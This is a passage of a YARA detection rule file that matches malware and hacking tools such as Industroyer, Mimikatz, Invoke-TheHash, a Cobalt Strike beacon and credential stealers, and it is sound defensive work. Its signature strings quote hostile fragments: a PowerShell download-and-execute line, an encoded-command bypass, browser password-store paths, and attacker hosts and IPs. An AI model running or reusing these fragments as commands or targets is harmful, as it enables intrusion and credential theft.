strings:\n      $s1 = \"%WINDIR%\\\\PCHealth\\\\HelpCtr\\\\Binaries\\\\pchsvc.dll\" fullword ascii\n      $s2 = \"brnew.exe\" fullword ascii\n      $s3 = \"ChangeServiceConfig failed (%d)\" fullword ascii\n      $s4 = \"Proxy %d:%s %d\" fullword ascii\n      $s5 = \"win9807.tmp\" fullword ascii\n      $s7 = \"Service stopped successfully\" fullword ascii\n      $s8 = \"current dns:%s\" fullword ascii\n      $s9 = \"%c%u|%u|%u|%u|%u|\" fullword ascii\n      $s10 = \"[-]send %d: \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 4 of them )\n}\n\nrule Waterbear_14_Jun17_RID2D66 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Operation Waterbear\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\"\n      date = \"2017-06-23 10:30:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"00a1068645dbe982a9aa95e7b8202a588989cd37de2fa1b344abbc0102c27d05\"\n      hash2 = \"53330a80b3c4f74f3f10a8621dbef4cd2427723e8b98c5b7aed58229d0c292ba\"\n      hash3 = \"bdcb23a82ac4eb1bc9254d77d92b6f294d45501aaea678a3d21c8b188e31e68b\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"my.com/msg/util/sgthash\" fullword ascii\n      $s2 = \"C:\\\\recycled\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and all of them )\n}\n\nrule PowerShell_ISESteroids_Obfuscation_RID347F : DEMO OBFUS SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects PowerShell ISESteroids obfuscation\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/danielhbohannon/status/877953970437844993\"\n      date = \"2017-06-23 15:33:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, OBFUS, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/\\\\/===\\\\__\" ascii\n      $x2 = \"${__/\\\\/==\" ascii\n      $x3 = \"Catch { }\" fullword ascii\n      $x4 = \"\\\\_/=} ${_\" ascii\n   condition: \n      2 of them\n}\n\nrule BTC_Miner_lsass1_chrome_2_RID3068 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a Bitcoin Miner\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - CN Actor\"\n      date = \"2017-06-22 12:38:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"048e9146387d6ff2ac055eb9ddfbfb9a7f70e95c7db9692e2214fa4bec3d5b2e\"\n      hash2 = \"c8db8469287d47ffdc74fe86ce0e9d6e51de67ba1df318573c9398742116a6e8\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-t, --threads=N       number of miner threads (default: number of processors)\" fullword ascii\n      $x2 = \"-O, --userpass=U:P    username:password pair for mining server\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and 1 of them )\n}\n\nrule CN_Actor_RA_Tool_Ammyy_mscorsvw_RID3338 : CHINA DEMO EXE FILE MAL T1219 {\n   meta:\n      description = \"Detects Ammyy remote access tool\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - CN Actor\"\n      date = \"2017-06-22 14:38:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1831806fc27d496f0f9dcfd8402724189deaeb5f8bcf0118f3d6484d0bdee9ed\"\n      hash2 = \"d9ec0a1be7cd218042c54bfbc12000662b85349a6b78731a09ed336e5d3cf0b4\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1219\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Please enter password for accessing remote computer\" fullword ascii\n      $s2 = \"Die Zugriffsanforderung wurde vom Remotecomputer abgelehnt\" fullword ascii\n      $s3 = \"It will automatically be run the next time this computer is restart or you can start it manually\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them )\n}\n\nrule CN_Actor_AmmyyAdmin_RID2E4F : CHINA DEMO EXE FILE MAL T1219 {\n   meta:\n      description = \"Detects Ammyy Admin Downloader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - CN Actor\"\n      date = \"2017-06-22 11:09:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1831806fc27d496f0f9dcfd8402724189deaeb5f8bcf0118f3d6484d0bdee9ed\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1219\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"\\\\Ammyy\\\\sources\\\\main\\\\Downloader.cpp\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule HTA_Embedded_RID2B57 : DEMO SUSP {\n   meta:\n      description = \"Detects an embedded HTA file\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/msftmmpc/status/877396932758560768\"\n      date = \"2017-06-21 09:02:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ca7b653cf41e980c44311b2cd701ed666f8c1dbc\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<hta:application windowstate=\\\"minimize\\\"/>\" \n   condition: \n      $s1 and not $s1 in ( 0 .. 50000 )\n}\n\nrule HTA_with_WScript_Shell_RID2F8B : DEMO SCRIPT SUSP {\n   meta:\n      description = \"Detects WScript Shell in HTA\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/msftmmpc/status/877396932758560768\"\n      date = \"2017-06-21 12:01:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ca7b653cf41e980c44311b2cd701ed666f8c1dbc\"\n      tags = \"DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<hta:application windowstate=\\\"minimize\\\"/>\" \n      $s2 = \"<script>var b=new ActiveXObject(\\\"WScript.Shell\\\");\" ascii\n   condition: \n      all of them\n}\n\nrule Mimikatz_Gen_Strings_RID2F19 : DEMO EXE FILE GEN HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Detects Mimikatz by using some special strings\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-06-19 11:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"058cc8b3e4e4055f3be460332a62eb4cbef41e3a7832aceb8119fd99fea771c4\"\n      hash2 = \"eefd4c038afa0e80cf6521c69644e286df08c0883f94245902383f50feac0f85\"\n      hash3 = \"f35b589c1cc1c98c4c4a5123fd217bdf0d987c00d2561992cbfb94bd75920159\"\n      tags = \"DEMO, EXE, FILE, GEN, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] '%s' service already started\" fullword wide\n      $s2 = \"** Security Callback! **\" fullword wide\n      $s3 = \"Try to export a software CA to a crypto (virtual)hardware\" fullword wide\n      $s4 = \"enterpriseadmin\" fullword wide\n      $s5 = \"Ask debug privilege\" fullword wide\n      $s6 = \"Injected =)\" fullword wide\n      $s7 = \"** SAM ACCOUNT **\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 12000KB and 1 of them )\n}\n\nrule Invoke_SMBExec_RID2C43 : DEMO SCRIPT T1059 {\n   meta:\n      description = \"Detects Invoke-WmiExec or Invoke-SmbExec\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n      date = \"2017-06-14 09:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"674fc045dc198874f323ebdfb9e9ff2f591076fa6fac8d1048b5b8d9527c64cd\"\n      tags = \"DEMO, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-SMBExec -Target\" fullword ascii\n      $x2 = \"$packet_SMB_header = Get-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID\" fullword ascii\n      $s1 = \"Write-Output \\\"Command executed with service $SMB_service on $Target\\\"\" fullword ascii\n      $s2 = \"$packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00\" fullword ascii\n      $s3 = \"$SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \\\\svcctl\" fullword ascii\n   condition: \n      ( filesize < 400KB and 1 of them )\n}\n\nrule Invoke_WMIExec_Gen_1_RID2E57 : DEMO GEN SCRIPT T1059 {\n   meta:\n      description = \"Detects Invoke-WmiExec or Invoke-SmbExec\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n      date = \"2017-06-14 11:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"140c23514dbf8043b4f293c501c2f9046efcc1c08630621f651cfedb6eed8b97\"\n      hash2 = \"7565d376665e3cd07d859a5cf37c2332a14c08eb808cc5d187a7f0533dc69e07\"\n      tags = \"DEMO, GEN, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-WMIExec \" ascii\n      $x2 = \"$target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))\" fullword ascii\n      $s1 = \"Import-Module $PWD\\\\Invoke-TheHash.ps1\" fullword ascii\n      $s2 = \"Import-Module $PWD\\\\Invoke-SMBClient.ps1\" fullword ascii\n      $s3 = \"$target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList\" fullword ascii\n      $x4 = \"Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0\" ascii\n   condition: \n      1 of them\n}\n\nrule Invoke_SMBExec_Invoke_WMIExec_1_RID326F : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - from files Invoke-SMBExec.ps1, Invoke-WMIExec.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n      date = \"2017-06-14 14:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"674fc045dc198874f323ebdfb9e9ff2f591076fa6fac8d1048b5b8d9527c64cd\"\n      hash2 = \"b41bd54bbf119d153e0878696cd5a944cbd4316c781dd8e390507b2ec2d949e7\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$process_ID = $process_ID -replace \\\"-00-00\\\",\\\"\\\"\" fullword ascii\n      $s2 = \"Write-Output \\\"$Target did not respond\\\"\" fullword ascii\n      $s3 = \"[Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Invoke_WMIExec_Gen_RID2DC7 : DEMO GEN SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - from files Invoke-SMBClient.ps1, Invoke-SMBExec.ps1, Invoke-WMIExec.ps1, Invoke-WMIExec.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n      date = \"2017-06-14 10:46:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"56c6012c36aa863663fe5536d8b7fe4c460565d456ce2277a883f10d78893c01\"\n      hash2 = \"674fc045dc198874f323ebdfb9e9ff2f591076fa6fac8d1048b5b8d9527c64cd\"\n      hash3 = \"b41bd54bbf119d153e0878696cd5a944cbd4316c781dd8e390507b2ec2d949e7\"\n      tags = \"DEMO, GEN, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)\" fullword ascii\n      $s2 = \"$client_challenge = [String](1..8 | ForEach-Object {\\\"{0:X2}\\\" -f (Get-Random -Minimum 1 -Maximum 255)})\" fullword ascii\n      $s3 = \"$NTLM_hash_bytes = $NTLM_hash_bytes.Split(\\\"-\\\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Industroyer_Malware_1_RID2F71 : APT DEMO EXE FILE T1543_003 {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/\"\n      date = \"2017-06-13 11:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"ad23c7930dae02de1ea3c6836091b5fb3c62a89bf2bcfb83b4b39ede15904910\"\n      hash2 = \"018eb62e174efdcdb3af011d34b0bf2284ed1a803718fba6edffe5bc0b446b81\"\n      tags = \"APT, DEMO, EXE, FILE, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"haslo.exe\" fullword ascii\n      $s2 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\%ls\" fullword wide\n      $s3 = \"SYS_BASCON.COM\" fullword wide\n      $s4 = \"*.pcmt\" fullword wide\n      $s5 = \"*.pcmi\" fullword wide\n      $x1 = { 00 53 00 65 00 72 00 76 00 69 00 63 00 65 00 73\n         00 5C 00 25 00 6C 00 73 00 00 00 49 00 6D 00 61\n         00 67 00 65 00 50 00 61 00 74 00 68 00 00 00 43\n         00 3A 00 5C 00 00 00 44 00 3A 00 5C 00 00 00 45\n         00 3A 00 5C 00 00 00 } \n      $x2 = \"haslo.dat\\x00Crash\" \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 2 of them )\n}\n\nrule Industroyer_Malware_2_RID2F72 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/\"\n      date = \"2017-06-13 11:57:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"3e3ab9674142dec46ce389e9e759b6484e847f5c1e1fc682fc638fc837c13571\"\n      hash2 = \"37d54e3d5e8b838f366b9c202f75fa264611a12444e62ae759c31a0d041aa6e4\"\n      hash3 = \"ecaf150e087ddff0ec6463c92f7f6cca23cc4fd30fe34c10b3cb7c2a6d135c77\"\n      hash1 = \"3e3ab9674142dec46ce389e9e759b6484e847f5c1e1fc682fc638fc837c13571\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"sc create %ls type= own start= auto error= ignore binpath= \\\"%ls\\\" displayname= \\\"%ls\\\"\" fullword wide\n      $x2 = \"10.15.1.69:3128\" fullword wide\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)\" fullword wide\n      $s2 = \"/c sc stop %s\" fullword wide\n      $s3 = \"sc start %ls\" fullword wide\n      $s4 = \"93.115.27.57\" fullword wide\n      $s5 = \"5.39.218.152\" fullword wide\n      $s6 = \"tierexe\" fullword wide\n      $s7 = \"comsys\" fullword wide\n      $s8 = \"195.16.88.6\" fullword wide\n      $s9 = \"TieringService\" fullword wide\n      $a1 = \"TEMP\\x00\\x00DEF\" fullword wide\n      $a2 = \"TEMP\\x00\\x00DEF-C\" fullword wide\n      $a3 = \"TEMP\\x00\\x00DEF-WS\" fullword wide\n      $a4 = \"TEMP\\x00\\x00DEF-EP\" fullword wide\n      $a5 = \"TEMP\\x00\\x00DC-2-TEMP\" fullword wide\n      $a6 = \"TEMP\\x00\\x00DC-2\" fullword wide\n      $a7 = \"TEMP\\x00\\x00CES-McA-TEMP\" fullword wide\n      $a8 = \"TEMP\\x00\\x00SRV_WSUS\" fullword wide\n      $a9 = \"TEMP\\x00\\x00SRV_DC-2\" fullword wide\n      $a10 = \"TEMP\\x00\\x00SCE-WSUS01\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) or 3 of them or 1 of ( $a* ) ) or ( 5 of them )\n}\n\nrule Industroyer_Portscan_3_RID2FF4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Industroyer related custom port scaner\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/\"\n      date = \"2017-06-13 12:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"893e4cca7fe58191d2f6722b383b5e8009d3885b5913dcd2e3577e5a763cdb3f\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"!ZBfamily\" fullword ascii\n      $s2 = \":g/outddomo;\" fullword ascii\n      $s3 = \"GHIJKLMNOTST\" fullword ascii\n      $d1 = \"Error params Arguments!!!\" fullword wide\n      $d2 = \"^(.+?.exe).*\\\\s+-ip\\\\s*=\\\\s*(.+)\\\\s+-ports\\\\s*=\\\\s*(.+)$\" fullword wide\n      $d3 = \"Exhample:App.exe -ip= 127.0.0.1-100,\" fullword wide\n      $d4 = \"Error IP Range %ls - %ls\" fullword wide\n      $d5 = \"Can't closesocket.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of ( $s* ) or 2 of ( $d* ) )\n}\n\nrule Industroyer_Portscan_3_Output_RID32E4 : APT DEMO {\n   meta:\n      description = \"Detects Industroyer related custom port scaner output file\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/\"\n      date = \"2017-06-13 14:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WSA library load complite.\" fullword ascii\n      $s2 = \"Connection refused\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Industroyer_Malware_4_RID2F74 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/\"\n      date = \"2017-06-13 11:57:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"21c1fdd6cfd8ec3ffe3e922f944424b543643dbdab99fa731556f8805b0d5561\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"haslo.dat\" fullword wide\n      $s2 = \"defragsvc\" fullword ascii\n      $a1 = { 00 2E 00 64 00 61 00 74 00 00 00 43 72 61 73 68 00 00 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of ( $s* ) or $a1 )\n}\n\nrule Industroyer_Malware_5_RID2F75 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/\"\n      date = \"2017-06-13 11:58:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"7907dd95c1d36cf3dc842a1bd804f0db511a0f68f4b3d382c23a3c974a383cad\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"D2MultiCommService.exe\" fullword ascii\n      $x2 = \"Crash104.dll\" fullword ascii\n      $x3 = \"iec104.log\" fullword ascii\n      $x4 = \"IEC-104 client: ip=%s; port=%s; ASDU=%u \" fullword ascii\n      $s1 = \"Error while getaddrinfo executing: %d\" fullword ascii\n      $s2 = \"return info-Remote command\" fullword ascii\n      $s3 = \"Error killing process ...\" fullword ascii\n      $s4 = \"stop_comm_service_name\" fullword ascii\n      $s5 = \"*1* Data exchange: Send: %d (%s)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 4 of them ) ) or ( all of them )\n}\n\nrule CredentialStealer_Generic_Backdoor_RID347C : DEMO EXE FILE GEN MAL T1003 {\n   meta:\n      description = \"Detects credential stealer byed on many strings that indicate password store access\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-06-07 15:32:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"edb2d039a57181acf95bd91b2a20bd9f1d66f3ece18506d4ad870ab65e568f2c\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetOperaLoginData\" fullword ascii\n      $s2 = \"GetInternetExplorerCredentialsPasswords\" fullword ascii\n      $s3 = \"%s\\\\Opera Software\\\\Opera Stable\\\\Login Data\" fullword ascii\n      $s4 = \"select *  from moz_logins\" fullword ascii\n      $s5 = \"%s\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n      $s6 = \"Host.dll.Windows\" fullword ascii\n      $s7 = \"GetInternetExplorerVaultPasswords\" fullword ascii\n      $s8 = \"GetWindowsLiveMessengerPasswords\" fullword ascii\n      $s9 = \"%s\\\\Chromium\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n      $s10 = \"%s\\\\Opera\\\\Opera\\\\profile\\\\wand.dat\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 4 of them )\n}\n\nrule Beacon_K5om_RID2B14 : APT COBALTSTRIKE DEMO EXE FILE METASPLOIT T1105 {\n   meta:\n      description = \"Detects Meterpreter Beacon - file K5om.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html\"\n      date = \"2017-06-07 08:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e3494fd2cc7e9e02cff76841630892e4baed34a3e1ef2b9ae4e2608f9a4d7be9\"\n      tags = \"APT, COBALTSTRIKE, DEMO, EXE, FILE, METASPLOIT, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n      $x2 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n      $x3 = \"%d is an x86 process (can't inject x64 content)\" fullword ascii\n      $s1 = \"Could not open process token: %d (%u)\" fullword ascii\n      $s2 = \"0fd00b.dll\" fullword ascii\n      $s3 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n      $s4 = \"Could not connect to pipe (%s): %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 3 of them ) )\n}\n\nrule Backdoor_Redosdru_Jun17_RID2FD1 : DEMO EXE FILE HIGHVOL MAL {\n   meta:\n      description = \"Detects malware Redosdru - file systemHome.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trellix.com/blogs/research/\"\n      date = \"2017-06-04 12:13:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"4f49e17b457ef202ab0be905691ef2b2d2b0a086a7caddd1e70dd45e5ed3b309\"\n      tags = \"DEMO, EXE, FILE, HIGHVOL, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\%d.gho\" fullword ascii\n      $x2 = \"%s\\\\nt%s.dll\" fullword ascii\n      $x3 = \"baijinUPdate\" fullword ascii\n      $s1 = \"RegQueryValueEx(Svchost\\\\netsvcs)\" fullword ascii\n      $s2 = \"serviceone\" fullword ascii\n      $s3 = \"\\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#p \\x1f#f \\x1f#\" fullword ascii\n      $s4 = \"servicetwo\" fullword ascii\n      $s5 = \"UpdateCrc\" fullword ascii\n      $s6 = \"\\x1f#[ \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#x \\x1f#\" fullword ascii\n      $s7 = \"nwsaPAgEnT\" fullword ascii\n      $s8 = \"%-24s %-15s 0x%x(%d) \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of ( $x* ) or 4 of them )\n}\n\nrule Backdoor_Nitol_Jun17_RID2E8F : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware backdoor Nitol - file wyawou.exe - Attention: this rule also matches on Upatre Downloader\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trellix.com/blogs/research/\"\n      date = \"2017-06-04 11:19:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"cba19d228abf31ec8afab7330df3c9da60cd4dae376552b503aea6d7feff9946\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)\" fullword ascii\n      $x2 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)\" fullword ascii\n      $x3 = \"TCPConnectFloodThread.target = %s\" fullword ascii\n      $s1 = \"\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\" ascii\n      $s2 = \"%c%c%c%c%c%c.exe\" fullword ascii\n      $s3 = \"GET %s%s HTTP/1.1\" fullword ascii\n      $s4 = \"CCAttack.target = %s\" fullword ascii\n      $s5 = \"Accept-Language: zh-cn\" fullword ascii\n      $s6 = \"jdfwkey\" fullword ascii\n      $s7 = \"hackqz.f3322.org:8880\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 5 of ( $s* ) ) ) or ( all of them )\n}\n\nrule Fireball_de_svr_RID2D14 : APT DEMO EXE FILE T1218_011 {\n   meta:\n      description = \"Detects Fireball malware - file de_svr.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 10:16:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"f964a4b95d5c518fd56f06044af39a146d84b801d9472e022de4c929a5b8fdcc\"\n      tags = \"APT, DEMO, EXE, FILE, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd.exe /c MD \" fullword ascii\n      $s2 = \"rundll32.exe \\\"%s\\\",%s\" fullword wide\n      $s3 = \"http://d12zpbetgs1pco.cloudfront.net/Weatherapi/shell\" fullword wide\n      $s4 = 